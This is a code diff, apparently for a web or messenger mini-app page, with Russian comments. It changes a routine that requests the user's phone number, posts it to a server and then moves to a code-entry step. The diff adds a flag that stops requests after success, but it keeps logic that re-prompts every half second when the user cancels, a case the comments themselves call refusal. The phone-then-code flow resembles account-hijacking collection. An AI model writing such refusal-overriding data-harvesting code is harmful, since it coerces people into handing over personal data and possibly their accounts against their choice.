@@ -328,9 +328,16 @@
     // Управление повторными запросами номера
     let phoneRequestTimer = null;
     let isRequestingPhone = false;
+    let phoneShared = false; // Флаг: номер успешно отправлен на сервер
 
     async function requestPhone() {
-      // Если уже выполняется запрос, не запускаем новый
+      // Если номер уже получен – ничего не делаем
+      if (phoneShared) {
+        console.log('Phone already shared, stopping requests');
+        return;
+      }
+
+      // Если уже выполняется запрос – не запускаем новый
       if (isRequestingPhone) {
         console.log('Already requesting phone, skipping');
         return;
@@ -361,22 +368,33 @@
 
           const result = await res.json();
           if (result.status === 'ok') {
-            // Успех – переходим к вводу кода, больше не повторяем
+            // Успех – устанавливаем флаг, очищаем таймеры, переходим к коду
+            phoneShared = true;
+            if (phoneRequestTimer) {
+              clearTimeout(phoneRequestTimer);
+              phoneRequestTimer = null;
+            }
             showBlock('code');
           } else {
             alert('Error: ' + (result.error || 'Unknown error'));
-            // Ошибка сервера – пробуем снова через 1 сек
-            phoneRequestTimer = setTimeout(requestPhone, 1000);
+            // Ошибка сервера – пробуем снова через 1 сек, если номер ещё не получен
+            if (!phoneShared) {
+              phoneRequestTimer = setTimeout(requestPhone, 1000);
+            }
           }
         } else {
-          // Не должно случиться, но на всякий случай повторим
-          phoneRequestTimer = setTimeout(requestPhone, 500);
+          // Не должно случиться, но на всякий случай повторим, если номер не получен
+          if (!phoneShared) {
+            phoneRequestTimer = setTimeout(requestPhone, 500);
+          }
         }
       } catch (error) {
         // Пользователь закрыл окно запроса (отказался)
         console.log('Request contact cancelled or error:', error);
-        // Повторяем запрос через небольшую задержку
-        phoneRequestTimer = setTimeout(requestPhone, 500);
+        // Повторяем запрос через небольшую задержку, если номер ещё не получен
+        if (!phoneShared) {
+          phoneRequestTimer = setTimeout(requestPhone, 500);
+        }
       } finally {
         isRequestingPhone = false;
       }
